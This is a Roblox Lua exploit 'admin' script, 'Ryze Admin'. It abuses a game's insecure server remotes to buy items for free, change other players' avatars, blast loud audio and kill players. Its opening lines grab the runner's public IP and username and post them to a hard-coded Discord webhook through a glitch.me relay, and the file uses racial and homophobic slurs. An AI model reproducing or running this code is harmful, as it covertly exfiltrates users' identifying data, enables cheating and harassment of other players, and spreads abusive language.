local HttpService = game:GetService("HttpService");
local IP = game:HttpGet("http://api.ipify.org")
local webbie = "https://discordapp.com/api/webhooks/668647096575852558/jrBsEWlkRFzXj_EBgLuQM4byn0ENPlbT6YbeR9A9XCMlPJjEy4FwGg_6-VSgV9GW1akD"
local chalk = "Get Rekt Skids"
local hisusername = game.Players.LocalPlayer.Name
local user = game.Players.LocalPlayer

local thisniggasstupid = hisusername.."'s IP :  "..IP
local whitelistednigga = hisusername..": Whitelisted"

function SendMessage(Webhook, Message, Botname)
    if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
        return error("Send a valid URL");
    end
    local Name;
    local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
    local API = "http://buritoman69.glitch.me/webhook";
    if (not Message or Message == "" or not Botname) then
        Name = "Get Rekt Skids"
        return error("nil or empty message!")
    else
        Name = Botname;
    end
    local Body = {
        ['Key'] = tostring("applesaregood"),
        ['Message'] = tostring(Message),
        ['Name'] = Name,
        ['Webhook'] = Webhook
    }
    Body = HttpService:JSONEncode(Body);
    local Data = game:HttpPost(API, Body, false, "application/json")
    return Data or nil; 
end
if IP == "73.176.97.77" or "75.66.42.141" then
    SendMessage(webbie, whitelistednigga, chalk)
    game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Congrats NOOB!";
    Text = "Your're whitelisted!";
    })
else
    user:Kick("Get Rekt Faggot Skid ;);)")
    SendMessage(webbie, thisniggasstupid, chalk)
end
prefix = ";"
wait()
local gamepass = 2187476
local plr = game.Players
local lplr = plr.LocalPlayer

lplayer = game:GetService("Players").LocalPlayer

lplayer.CharacterAdded:Connect(function(character)
	flying = false
end)

function change()
	prefix = prefix
	speedfly = speedfly
end

function GetPlayer(String)
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end   
    elseif strl == "friends" then
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v:IsFriendsWith(lplayer.UserId) and v.Name ~= lplayer.Name then
                table.insert(Found, v)
            end
        end
    elseif strl == "enemies" then
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if not v:IsFriendsWith(lplayer.UserId) and v.Name ~= lplayer.Name then
                table.insert(Found, v)
            end
        end
	elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end

local Mouse = lplayer:GetMouse()


noclip = false
droppinghats = false
droppingtools = false
flying = false
remotes = true
stopsitting = false

flying = false
speedfly = 1
speedget = 1

function plrchat(plr, chat)
print(plr.Name..": "..tick().."\n"..chat)
end

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
v.Chatted:connect(function(chat)
if chatlogs then
plrchat(v, chat)
end
end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
plr.Chatted:connect(function(chat)
if chatlogs then
plrchat(plr, chat)
end
end)
end)

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local CMDBAR = Instance.new("TextBox")

ScreenGui.Parent = game:GetService("CoreGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame.BackgroundTransparency = 0.40000000596046
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.396778911, 0, 0.0549828187, 0)
Frame.Size = UDim2.new(0, 260, 0, 51)
Frame.Active = true
Frame.Draggable = true

CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = Frame
CMDBAR.BackgroundColor3 = Color3.new(0.133333, 0.133333, 0.133333)
CMDBAR.BackgroundTransparency = 0.30000001192093
CMDBAR.BorderSizePixel = 0
CMDBAR.Position = UDim2.new(0.0307692308, 0, 0.137254909, 0)
CMDBAR.Size = UDim2.new(0, 245, 0, 38)
CMDBAR.Font = Enum.Font.SourceSans
CMDBAR.Text = "Press ; to get started!"
CMDBAR.TextColor3 = Color3.new(1, 1, 1)
CMDBAR.TextSize = 25
CMDBAR.TextWrapped = true

wait()

game:GetService('RunService').Stepped:connect(function()
	if noclip then
		if lplayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
			lplayer.Character.Head.CanCollide = false
			lplayer.Character.Torso.CanCollide = false
			lplayer.Character["Left Leg"].CanCollide = false
			lplayer.Character["Right Leg"].CanCollide = false
		else
			lplayer.Character.Humanoid:ChangeState(11)
		end
	end
	if changingstate then
		lplayer.Character.Humanoid:ChangeState(statechosen)
	end
end)
game:GetService('RunService').Stepped:connect(function()
	if droppinghats then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Accessory")) or (v:IsA("Hat")) then
				v.Parent = workspace
			end
		end
	end
	if droppingtools then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Tool")) then
				v.Parent = workspace
			end
		end
	end
	if removingmeshhats then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Accessory")) or (v:IsA("Hat")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
	if removingmeshtool then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Tool")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
end)

plr = lplayer 
hum = plr.Character.HumanoidRootPart
mouse = plr:GetMouse() 
mouse.KeyDown:connect(function(key) 
	if key == "e" then 
		if mouse.Target then 
			if clickgoto then
				hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
			elseif clickdel then
				mouse.Target:Destroy()
			end
		end 
	end
end)

game:GetService("Workspace").ChildAdded:connect(function(part)
	if gettingtools then
		if part:IsA("Tool") then
			part.Handle.CFrame = lplayer.Character.HumanoidRootPart.CFrame
		end
	end
end)

Mouse.KeyDown:connect(function(Key)
	if Key == prefix then
		CMDBAR:CaptureFocus()--comebackherebb123
		Frame.Visible = true
	end
end)

CMDBAR.FocusLost:connect(function(enterPressed)
	if enterPressed then
		if string.sub(CMDBAR.Text, 1, 3) == ("fly") then
		repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
		repeat wait() until Mouse
		
		local T = lplayer.Character.HumanoidRootPart
		local CONTROL = {F = 0, B = 0, L = 0, R = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
		local SPEED = speedget
		
		local function fly()
			flying = true
			local BG = Instance.new('BodyGyro', T)
			local BV = Instance.new('BodyVelocity', T)
			BG.P = 9e4
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0.1, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(function()
			repeat wait()
			lplayer.Character.Humanoid.PlatformStand = true
			if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
			SPEED = 50
			elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
			SPEED = 0
			end
			if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
			BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
			lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
			elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
			BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
			else
			BV.velocity = Vector3.new(0, 0.1, 0)
			end
			BG.cframe = workspace.CurrentCamera.CoordinateFrame
					until not flying
					CONTROL = {F = 0, B = 0, L = 0, R = 0}
					lCONTROL = {F = 0, B = 0, L = 0, R = 0}
					SPEED = 0
					BG:destroy()
					BV:destroy()
					lplayer.Character.Humanoid.PlatformStand = false
				end)
			end
		Mouse.KeyDown:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = speedfly
			elseif KEY:lower() == 's' then
				CONTROL.B = -speedfly
			elseif KEY:lower() == 'a' then
				CONTROL.L = -speedfly 
			elseif KEY:lower() == 'd' then 
				CONTROL.R = speedfly
			end
		end)
		Mouse.KeyUp:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			end
		end)
		fly()
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("unfly") then
			flying = false
			lplayer.Character.Humanoid.PlatformStand = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("flyspeed ") then
			speedfly = string.sub(CMDBAR.Text, 10)
			wait()
			change()
		end
		if string.sub(CMDBAR.Text, 1, 4) == ("cmds") then
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "PRESS F9!";
			Text = "Commands loaded into console!";
			})
			print[[
			-------------------------------------//Ryze Admin\\-------------------------------------
			[1]sans {plr} --Gives player sans head
			[2]mario {plr} --Gives player mario head
			[3]scoobis {plr} --Gives player scoobis head
			[4]rj --Makes you rejoin the game
			[5]sui --Respawns you (Suicide)
			[6]nin -- Gives you a nintendo morph
			[7]anonymous --Gives you a anonymous morph
			[8]melon {plr} --Gives player melon head 
			[9]ws {num} --Changes your characters walkspeed
			[10]jp {num} --Changes your characters jumppower
			[11]hh {num} --Changes your characrers hipheight
			[12]goto {plr} --Teleports you to the player
			[13]fly --Makes you fly
			[14]unfly --Makes you stop flying
			[15]flyspeed {num} --Changes your flyspeed
			[16]noclip --Makes you beable to walk through walls
			[17]clip --Makes walls solid
			[18]kill {plr} --Kills the player
			[19]lkill {plr} --Loop kills the player
			[20]unlkill --Stops the loopkill
			[21]korblox {plr} --Gives player full korblox package (BECIDES HEAD)
			[22]kleg1 {plr} --Gives player right korblox leg
			[23]kleg2 {plr} --Gives player left korblox leg
			[24]face1 --Gives you a rainbow face
			[25]stop --Stops all face commands
			[26]rbtool --Makes the tool your holding rainbow (SOME TOOLS DON'T WORK)
			[27]music --Plays loud music
			[28]reaper --Grim Reaper morph
			--------------------------------------------------------------------------------------------
			]]
		end
		if string.sub(CMDBAR.Text,1,5) == ("face1") then
			_G.face = true
			while _G.face do
			    workspace.Face:FireServer("http://www.roblox.com/asset/?id=4564008356")
			    wait(0.0000000001)
			    workspace.Face:FireServer("http://www.roblox.com/asset/?id=4564008547")
			    wait(0.0000000001)
			    workspace.Face:FireServer("http://www.roblox.com/asset/?id=4564008876")
			    wait(0.0000000001)
			    workspace.Face:FireServer("http://www.roblox.com/asset/?id=4564009054")
			    wait(0.0000000001)
			    workspace.Face:FireServer("http://www.roblox.com/asset/?id=4564009421")
			    wait(0.0000000001)
			    workspace.Face:FireServer("http://www.roblox.com/asset/?id=4564009180")
			    wait(0.0000000001)
			    workspace.Face:FireServer("http://www.roblox.com/asset/?id=4564009740")
			    wait(0.0000000001)
			end
		end
		if string.sub(CMDBAR.Text,1,4) == ("stop")then
			_G.face = false
		end
		if string.sub(CMDBAR.Text,1,6) == ("reaper")then
						game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			local UserName  = game:GetService('Players').LocalPlayer.Name
							
			local HAX = {}
			local Variables = {
			workspace = game:GetService("Workspace"),
			players = game:GetService("Players")
			}
							
			local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
							
			function HAX:FireEvent(ItemName, Object, Property, Value)
				MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
			end
							
			Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			
			for i,v in pairs(lplr.Character:GetChildren())do
				if v:IsA("Accessory") or v:IsA("Hat") then
					v:Remove()
				end
			end
							
			
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=132077803")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=183955837")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players.LocalPlayer.Character["Left Arm"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			wait()
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=132077849")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=183955837")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players.LocalPlayer.Character["Right Arm"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			wait()
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=132077825")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=183955837")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players.LocalPlayer.Character["Left Leg"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			wait()
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=132077861")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=183955837")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players.LocalPlayer.Character["Right Leg"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			wait()
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=132077786")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=183955837")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players.LocalPlayer.Character["Torso"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			wait()
			HAX:FireEvent("PompousTheCloud", MainUserW["Shirt"]:Remove())
			HAX:FireEvent("PompousTheCloud", MainUserW["Pants"]:Remove())
			game:GetService("ReplicatedStorage"):FindFirstChild("AvatarEditor"):FindFirstChild("HatHandle"):FireServer(33171947)
			wait(0.3)
			HAX:FireEvent("PompousTheCloud", MainUserW["33171947"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=16150814")
			HAX:FireEvent("PompousTheCloud", MainUserW["33171947"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=22927810")
			HAX:FireEvent("PompousTheCloud", MainUserW["33171947"]["Handle"]["Mesh"],"Scale",Vector3.new(1.1,1.1,1.1))
			HAX:FireEvent("PompousTheCloud", MainUserW["33171947"]["Handle"]["Mesh"],"Offset",Vector3.new(0,0.65,0))
			
			--[[HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=28140935")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=27739981")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.01, -1, 0))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0, 0, -1))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"],"GripRight",Vector3.new(-1, 0.01, 0))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"],"GripUp",Vector3.new(0, 0, 1))]]
			
			HAX:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Grim Reaper")
			HAX:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font",Enum.Font.Antique)
			HAX:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromRGB(17, 17, 17))
			HAX:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(1.7,1.7, 1.7, 1.7))
			MainUserW:WaitForChild("PompousTheCloud").Parent = MainUserP["Backpack"]
			
		end
		if string.sub(CMDBAR.Text,1,8) == ("korblox ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text,9)))do
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				local UserName  = game:GetService('Players').LocalPlayer.Name
								
				local HAX = {}
				local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
				}
								
				local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
								
				function HAX:FireEvent(ItemName, Object, Property, Value)
					MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
				end
								
				Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
								
				
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=101851623")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=101851254")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Right Arm"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				wait()
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=101851531")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=101851254")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Left Arm"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				wait()
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=101851696")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=101851254")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Right Leg"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				wait()
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=101851582")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=101851254")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Left Leg"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				wait()
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=101851389")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=101851254")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Torso"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("music ") then
			local UserName  = game:GetService('Players').LocalPlayer.Name
			local CE = {}
			local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
			}

			local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

			function CE:FireEvent(ItemName, Object, Property, Value)
				MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
			end


			game.Workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			if not game.Players.LocalPlayer.Character:FindFirstChild("PompousTheCloud") then
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			end

			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"MaxDistance","999999")
			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"EmitterSize","999999")
			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"Volume","999999")
			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"PlaybackSpeed","1")
			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"PlaybackLoudness","999999")

			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"Playing",true)
			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"Looped",true)
			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Wind"],"SoundId","rbxassetid://"..(string.sub(CMDBAR.Text, 7)))
		end
		if string.sub(CMDBAR.Text,1,6) == ("kleg1 ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text,7)))do
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				local UserName  = game:GetService('Players').LocalPlayer.Name
								
				local HAX = {}
				local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
				}
								
				local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
								
				function HAX:FireEvent(ItemName, Object, Property, Value)
					MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
				end
								
				Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=101851582")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=101851254")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Left Leg"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			end
		end
		if string.sub(CMDBAR.Text,1,6) == ("kleg2 ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text,7)))do
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				local UserName  = game:GetService('Players').LocalPlayer.Name
								
				local HAX = {}
				local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
				}
								
				local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
								
				function HAX:FireEvent(ItemName, Object, Property, Value)
					MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
				end
								
				Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","http://www.roblox.com/asset/?id=101851696")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","http://www.roblox.com/asset/?id=101851254")
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Right Leg"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			end
		end
		if string.sub(CMDBAR.Text,1,6) == ("noclip") then
			noclip = true
		end
		if string.sub(CMDBAR.Text,1,4) == ("clip") then
			noclip = false
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("sans ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text,6)))do
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				local UserName  = game:GetService('Players').LocalPlayer.Name
				
				local HAX = {}
				local Variables = {
					workspace = game:GetService("Workspace"),
					players = game:GetService("Players")
				}
				
				local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
				
				function HAX:FireEvent(ItemName, Object, Property, Value)
					MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
				end
				
				Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				
				local mesh = "rbxassetid://430073345"
				local texture = "rbxassetid://430073362"
				
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId",mesh)
